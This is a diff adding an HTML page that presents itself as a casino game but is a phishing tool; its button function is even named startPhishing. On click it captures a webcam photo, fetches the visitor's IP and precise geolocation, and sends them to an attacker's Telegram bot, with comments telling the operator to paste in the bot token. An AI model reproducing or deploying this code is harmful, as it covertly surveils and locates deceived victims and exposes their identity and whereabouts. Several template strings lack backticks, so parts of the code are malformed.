@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Casino Dash</title>
+<style>
+body {
+background-color: #003300; /* Dark green for casino feel */
+color: #FFD700; /* Gold text for luxury */
+font-family: 'Courier New', monospace;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+margin: 0;
+background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="%23003300"/><circle cx="50" cy="50" r="40" fill="%23FFD700" opacity="0.5"/><text x="50" y="50" font-size="20" text-anchor="middle" fill="%23FF0000">Casino</text></svg>');
+background-repeat: repeat;
+}
+.casino-container {
+background-color: rgba(0, 0, 0, 0.8);
+padding: 20px;
+border: 2px solid #FFD700;
+border-radius: 10px;
+text-align: center;
+box-shadow: 0 0 10px #FFD700;
+}
+.casino-button {
+background-color: #FF4500; /* Orange red for excitement */
+color: #FFD700;
+padding: 10px 20px;
+border: none;
+border-radius: 5px;
+cursor: pointer;
+font-size: 16px;
+margin-top: 20px;
+}
+.casino-button:hover {
+background-color: #FF6347; /* Tomato for hover effect */
+}
+.status-message {
+margin-top: 10px;
+font-size: 14px;
+}
+</style>
+</head>
+<body>
+<div class="casino-container">
+<h1>Welcome to the High-Stakes Game</h1>
+<p>Spin the wheel and join the thrill. First, grant access to play.</p>
+<button class="casino-button" onclick="startPhishing()">Start Game</button>
+<p class="status-message" id="status">Ready to roll the dice...</p>
+</div>
+
+<script>
+const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; //Tempel Token Bot lu Lamer
+const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Tempel user id telegram lu Lamer 
+async function startPhishing() {
+document.getElementById('status').innerText = 'Requesting access...';
+
+// Request camera permission
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+document.getElementById('status').innerText = 'Camera access granted. Capturing photo...';
+const video = document.createElement('video');
+video.srcObject = stream;
+video.play();
+
+// Take photo from stream
+setTimeout(() => {
+const canvas = document.createElement('canvas');
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0);
+const photoDataUrl = canvas.toDataURL('image/jpeg'); // Get photo as data URL
+stream.getTracks().forEach(track => track.stop()); // Stop camera
+
+// Fetch IP address
+fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(ipData => {
+const ipAddress = ipData.ip;
+
+// Fetch geolocation
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(async position => {
+const latitude = position.coords.latitude;
+const longitude = position.coords.longitude;
+const accuracy = position.coords.accuracy; // For precise tracking
+
+// Create Google Maps link with accurate location
+const googleMapsLink = https://www.google.com/maps?q=${latitude},${longitude};
+
+// Send data to Telegram
+const formData = new FormData();
+formData.append('chat_id', telegramChatId);
+formData.append('caption', IP Address: ${ipAddress}\nLocation: ${latitude}, ${longitude}\nGoogle Maps Link: ${googleMapsLink});
+
+// Convert photo data URL to blob for sending
+fetch(photoDataUrl)
+.then(res => res.blob())
+.then(photoBlob => {
+formData.append('photo', photoBlob, 'photo.jpg');
+
+fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
+method: 'POST',
+body: formData
+})
+.then(response => response.json())
+.then(data => {
+if (data.ok) {
+document.getElementById('status').innerText = 'Data sent successfully. Game over.';
+// Optionally display maps link on page
+window.open(googleMapsLink, '_blank');
+
+} else {
+document.getElementById('status').innerText = 'Send failed.';
+}
+});
+});
+}, error => {
+document.getElementById('status').innerText = 'Location access denied.';
+});
+} else {
+document.getElementById('status').innerText = 'Geolocation not supported.';
+}
+});
+}, 2000); // Delay to capture photo
+})
+.catch(error => {
+document.getElementById('status').innerText = 'Camera access denied. Game aborted.';
+});
+}
+</script>
+</body>
+</html>
